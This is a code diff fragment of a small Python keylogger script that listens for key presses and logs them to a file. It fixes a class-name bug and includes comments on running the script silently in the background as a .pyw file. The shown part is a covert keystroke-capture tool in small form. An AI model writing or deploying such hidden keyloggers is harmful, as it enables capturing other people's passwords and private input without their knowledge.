@@ -12,7 +12,7 @@ def on_press(key):                             # define the on_press function
     #if key == Key.esc:                             # if the key that was pressed is the escape key
     #    return False                                # return false to stop the listener
 
-with listener(on_press = on_press) as listener:    # create a listener and set the on_press function to the on_press function
+with Listener(on_press = on_press) as listener:    # create a listener and set the on_press function to the on_press function
     listener.join()                                # join the listener to the main thread
 
 # to run, type on your terminal "python .\logger.pyw"
@@ -21,4 +21,4 @@ with listener(on_press = on_press) as listener:    # create a listener and set t
 # to see the log in real time, type on your terminal "tail -f .\key_log.txt"
 
 #to run behind the scenes, just open the pyw file, the screen will refresh and it will be working
-#to stop, go to task manager and kill the python/ python(32bit) process
+#to stop, go to task manager and kill the python/ python(32bit) process  
